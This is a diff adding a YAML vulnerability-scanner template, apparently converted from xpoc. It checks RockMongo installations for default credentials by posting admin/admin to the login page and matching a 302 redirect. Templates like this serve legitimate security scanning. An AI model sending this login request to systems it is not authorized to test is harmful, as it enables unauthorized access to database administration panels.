@@ -1,0 +1,21 @@
+id: yaml-poc-rockmongo-rockmongo-unauthorized_access-CT-158732
+info:
+  name: Yaml Poc Rockmongo Rockmongo Unauthorized_Access Ct 158732
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-rockmongo-rockmongo-unauthorized_access-CT-158732'
+  tags: unauth
+  reference: []
+http:
+- method: POST
+  path:
+  - /index.php?action=login.index&host=0
+  body: more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
